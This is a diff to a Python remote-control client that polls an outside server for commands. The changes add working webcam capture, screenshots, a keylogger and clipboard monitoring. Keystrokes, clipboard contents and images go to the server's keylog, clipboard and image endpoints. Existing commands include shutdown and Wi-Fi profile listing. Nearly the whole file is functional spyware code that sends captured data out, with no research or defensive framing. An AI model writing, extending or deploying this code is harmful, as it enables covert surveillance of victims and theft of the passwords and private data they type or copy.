@@ -17,6 +17,37 @@ import re
 import base64
 from urllib.parse import urljoin
 
+# Try to import advanced features
+try:
+    import cv2
+    import numpy as np
+    from PIL import Image, ImageGrab
+    from io import BytesIO
+    ADVANCED_FEATURES = True
+except ImportError:
+    print("Advanced features not available. Install: pip install opencv-python pillow")
+    ADVANCED_FEATURES = False
+
+# Try to import clipboard and keylogging
+try:
+    import pyperclip
+    CLIPBOARD_AVAILABLE = True
+except ImportError:
+    try:
+        import win32clipboard
+        import win32con
+        CLIPBOARD_AVAILABLE = True
+    except ImportError:
+        print("Clipboard features not available. Install: pip install pyperclip")
+        CLIPBOARD_AVAILABLE = False
+
+try:
+    from pynput import keyboard
+    KEYLOGGER_AVAILABLE = True
+except ImportError:
+    print("Keylogger not available. Install: pip install pynput")
+    KEYLOGGER_AVAILABLE = False
+
 # Configuration
 SERVER_URL = os.environ.get('SERVER_URL', 'https://pablo1-production.up.railway.app')
 RECONNECT_DELAY = 10     # Seconds between reconnection attempts
@@ -29,8 +60,20 @@ class WebClient:
         self.running = True
         self.session = requests.Session()
         self.system_info = self.get_system_info()
+        
+        # Advanced features state
+        self.keystrokes = []
+        self.keylogger_listener = None
+        self.keylogger_thread = None
+        self.clipboard_monitoring = False
+        self.clipboard_thread = None
+        self.last_clipboard_content = None
+        
         print(f"Web Client initialized with ID: {self.client_id}")
         print(f"Target Server: {SERVER_URL}")
+        print(f"Advanced Features: {ADVANCED_FEATURES}")
+        print(f"Keylogger Available: {KEYLOGGER_AVAILABLE}")
+        print(f"Clipboard Available: {CLIPBOARD_AVAILABLE}")
 
     def get_system_info(self):
         """Collect detailed system information"""
@@ -83,7 +126,23 @@ class WebClient:
         try:
             print(f"Executing command: {command}")
             
-            # Handle special commands with mappings
+            # Handle special commands first
+            if command == "capture_webcam":
+                return self.capture_webcam()
+            elif command == "capture_screenshot":
+                return self.capture_screenshot()
+            elif command == "keylog_start":
+                return self.start_keylogger()
+            elif command == "keylog_stop":
+                return self.stop_keylogger()
+            elif command == "clipboard_start":
+                return self.start_clipboard_monitoring()
+            elif command == "clipboard_stop":
+                return self.stop_clipboard_monitoring()
+            elif command == "clipboard_get":
+                return self.get_clipboard_content()
+            
+            # Handle mapped system commands
             command_mappings = {
                 "shutdown": "shutdown /s /t 0",
                 "open_cmd": "start cmd",
@@ -92,14 +151,7 @@ class WebClient:
                 "open_notepad": "notepad.exe",
                 "get_owner": "net user %USERNAME%",
                 "tasklist": "tasklist",
-                "get_wifi_passwords": "netsh wlan show profiles",
-                "capture_webcam": "echo Webcam capture not implemented in web client",
-                "capture_screenshot": "echo Screenshot capture not implemented in web client",
-                "keylog_start": "echo Keylogger not implemented in web client",
-                "keylog_stop": "echo Keylogger not implemented in web client",
-                "clipboard_start": "echo Clipboard monitoring not implemented in web client",
-                "clipboard_stop": "echo Clipboard monitoring not implemented in web client",
-                "clipboard_get": "echo Clipboard access not implemented in web client"
+                "get_wifi_passwords": "netsh wlan show profiles"
             }
             
             # Use mapped command if available, otherwise use original
@@ -131,6 +183,245 @@ class WebClient:
         except Exception as e:
             print(f"Command execution error: {e}")
             return f"ERROR: {str(e)}"
+
+    def capture_webcam(self):
+        """Capture an image from the webcam"""
+        if not ADVANCED_FEATURES:
+            return "ERROR: Webcam features not available. Install: pip install opencv-python"
+            
+        try:
+            # Initialize webcam
+            cap = cv2.VideoCapture(0)
+            
+            if not cap.isOpened():
+                return "ERROR: Could not access webcam"
+                
+            # Wait a moment for the camera to initialize
+            time.sleep(1)
+            
+            # Capture a frame
+            ret, frame = cap.read()
+            
+            # Release the webcam
+            cap.release()
+            
+            if not ret:
+                return "ERROR: Failed to capture image"
+                
+            # Convert the image to JPEG format
+            _, buffer = cv2.imencode('.jpg', frame)
+            jpg_as_text = base64.b64encode(buffer).decode('utf-8')
+            
+            print("Webcam image captured successfully")
+            return {
+                "message": "Webcam image captured successfully",
+                "image_data": jpg_as_text
+            }
+            
+        except Exception as e:
+            print(f"Webcam capture error: {e}")
+            return f"ERROR: {str(e)}"
+            
+    def capture_screenshot(self):
+        """Capture a screenshot of the client's screen"""
+        if not ADVANCED_FEATURES:
+            return "ERROR: Screenshot features not available. Install: pip install pillow"
+            
+        try:
+            # Capture the screen
+            screenshot = ImageGrab.grab()
+            
+            # Convert to a format we can send
+            buffer = BytesIO()
+            screenshot.save(buffer, format="JPEG", quality=70)
+            buffer.seek(0)
+            
+            # Convert to base64
+            img_base64 = base64.b64encode(buffer.getvalue()).decode('utf-8')
+            
+            print("Screenshot captured successfully")
+            return {
+                "message": "Screenshot captured successfully",
+                "image_data": img_base64
+            }
+            
+        except Exception as e:
+            print(f"Screenshot capture error: {e}")
+            return f"ERROR: {str(e)}"
+            
+    def start_keylogger(self):
+        """Start capturing keystrokes"""
+        if not KEYLOGGER_AVAILABLE:
+            return "ERROR: Keylogger not available. Install: pip install pynput"
+            
+        try:
+            if self.keylogger_listener:
+                return "Keylogger already running"
+
+            def on_press(key):
+                try:
+                    self.keystrokes.append(str(key))
+                except:
+                    pass
+            
+            self.keylogger_listener = keyboard.Listener(on_press=on_press)
+            self.keylogger_listener.start()
+            self.keylogger_thread = threading.Thread(target=self.send_keylog_data, daemon=True)
+            self.keylogger_thread.start()
+            print("Keylogger started")
+            return "Keylogger started successfully"
+        except Exception as e:
+            print(f"Keylogger start error: {e}")
+            return f"ERROR: {str(e)}"
+
+    def stop_keylogger(self):
+        """Stop capturing keystrokes"""
+        try:
+            if self.keylogger_listener:
+                self.keylogger_listener.stop()
+                self.keylogger_listener = None
+                self.keylogger_thread = None
+                self.keystrokes = []
+                print("Keylogger stopped")
+                return "Keylogger stopped successfully"
+            return "Keylogger not running"
+        except Exception as e:
+            print(f"Keylogger stop error: {e}")
+            return f"ERROR: {str(e)}"
+            
+    def send_keylog_data(self):
+        """Periodically send captured keystrokes to the server"""
+        while self.running and self.keylogger_listener:
+            if self.keystrokes:
+                try:
+                    keylog_data = " ".join(self.keystrokes)
+                    # Send keylog data to server
+                    url = urljoin(SERVER_URL, '/api/keylog_data')
+                    data = {
+                        'client_id': self.client_id,
+                        'keylog_data': keylog_data
+                    }
+                    
+                    response = self.session.post(url, json=data, timeout=5)
+                    if response.status_code == 200:
+                        print(f"Sent keylog data: {keylog_data[:50]}..." if len(keylog_data) > 50 else f"Sent keylog data: {keylog_data}")
+                    self.keystrokes = []
+                except Exception as e:
+                    print(f"Error sending keylog data: {e}")
+            time.sleep(5)  # Send keylog data every 5 seconds
+            
+    def get_clipboard_content(self):
+        """Get the current clipboard content"""
+        if not CLIPBOARD_AVAILABLE:
+            return "ERROR: Clipboard features not available. Install: pip install pyperclip"
+            
+        try:
+            clipboard_text = ""
+            
+            # Try to use pyperclip first
+            try:
+                import pyperclip
+                clipboard_text = pyperclip.paste()
+            except:
+                # Fall back to win32clipboard on Windows
+                try:
+                    import win32clipboard
+                    import win32con
+                    
+                    win32clipboard.OpenClipboard()
+                    try:
+                        if win32clipboard.IsClipboardFormatAvailable(win32con.CF_TEXT):
+                            clipboard_text = win32clipboard.GetClipboardData(win32con.CF_TEXT).decode('utf-8', errors='replace')
+                        elif win32clipboard.IsClipboardFormatAvailable(win32con.CF_UNICODETEXT):
+                            clipboard_text = win32clipboard.GetClipboardData(win32con.CF_UNICODETEXT)
+                    finally:
+                        win32clipboard.CloseClipboard()
+                except:
+                    return "ERROR: Failed to access clipboard"
+            
+            if not clipboard_text:
+                return "Clipboard is empty or contains non-text data"
+                
+            return clipboard_text
+            
+        except Exception as e:
+            print(f"Clipboard access error: {e}")
+            return f"ERROR: {str(e)}"
+            
+    def start_clipboard_monitoring(self):
+        """Start monitoring the clipboard for changes"""
+        if not CLIPBOARD_AVAILABLE:
+            return "ERROR: Clipboard features not available. Install: pip install pyperclip"
+            
+        if self.clipboard_monitoring:
+            return "Clipboard monitoring is already running"
+            
+        try:
+            self.last_clipboard_content = self.get_clipboard_content()
+            if isinstance(self.last_clipboard_content, str) and self.last_clipboard_content.startswith("ERROR:"):
+                return self.last_clipboard_content
+                
+            self.clipboard_monitoring = True
+            self.clipboard_thread = threading.Thread(target=self.monitor_clipboard, daemon=True)
+            self.clipboard_thread.start()
+            
+            print("Clipboard monitoring started")
+            return "Clipboard monitoring started successfully"
+            
+        except Exception as e:
+            print(f"Clipboard monitoring start error: {e}")
+            return f"ERROR: {str(e)}"
+            
+    def stop_clipboard_monitoring(self):
+        """Stop monitoring the clipboard"""
+        if not self.clipboard_monitoring:
+            return "Clipboard monitoring is not running"
+            
+        try:
+            self.clipboard_monitoring = False
+            self.clipboard_thread = None
+            self.last_clipboard_content = None
+            
+            print("Clipboard monitoring stopped")
+            return "Clipboard monitoring stopped successfully"
+            
+        except Exception as e:
+            print(f"Clipboard monitoring stop error: {e}")
+            return f"ERROR: {str(e)}"
+            
+    def monitor_clipboard(self):
+        """Monitor clipboard for changes and send updates"""
+        print("Clipboard monitoring thread started")
+        
+        while self.running and self.clipboard_monitoring:
+            try:
+                current_content = self.get_clipboard_content()
+                
+                if isinstance(current_content, str) and not current_content.startswith("ERROR:"):
+                    if current_content != self.last_clipboard_content and current_content != "Clipboard is empty or contains non-text data":
+                        print("Clipboard content changed")
+                        
+                        self.last_clipboard_content = current_content
+                        
+                        # Send clipboard update to server
+                        try:
+                            url = urljoin(SERVER_URL, '/api/clipboard_data')
+                            data = {
+                                'client_id': self.client_id,
+                                'clipboard_data': current_content[:10000],  # Limit size
+                                'timestamp': time.time()
+                            }
+                            
+                            response = self.session.post(url, json=data, timeout=5)
+                            if response.status_code == 200:
+                                print("Sent clipboard update")
+                        except Exception as e:
+                            print(f"Error sending clipboard update: {e}")
+                
+            except Exception as e:
+                print(f"Clipboard monitoring error: {e}")
+                
+            time.sleep(1)  # Check every second
 
     def register_client(self):
         """Register this client with the server"""
@@ -184,12 +475,41 @@ class WebClient:
         """Send command result back to server"""
         try:
             url = urljoin(SERVER_URL, '/api/command_result')
-            data = {
-                'client_id': self.client_id,
-                'command_id': command_id,
-                'command': command,
-                'result': result
-            }
+            
+            # Handle special result types (webcam/screenshot with image data)
+            if isinstance(result, dict) and 'image_data' in result:
+                # Send image data separately
+                image_url = urljoin(SERVER_URL, '/api/image_data')
+                image_data = {
+                    'client_id': self.client_id,
+                    'command_id': command_id,
+                    'command': command,
+                    'image_data': result['image_data'],
+                    'message': result['message']
+                }
+                
+                # Send image data
+                img_response = self.session.post(image_url, json=image_data, timeout=30)
+                if img_response.status_code == 200:
+                    print(f"Successfully sent image data for command: {command}")
+                else:
+                    print(f"Failed to send image data: {img_response.status_code}")
+                
+                # Send regular result
+                data = {
+                    'client_id': self.client_id,
+                    'command_id': command_id,
+                    'command': command,
+                    'result': result['message']
+                }
+            else:
+                # Regular result
+                data = {
+                    'client_id': self.client_id,
+                    'command_id': command_id,
+                    'command': command,
+                    'result': result
+                }
             
             response = self.session.post(url, json=data, timeout=10)
             if response.status_code == 200:
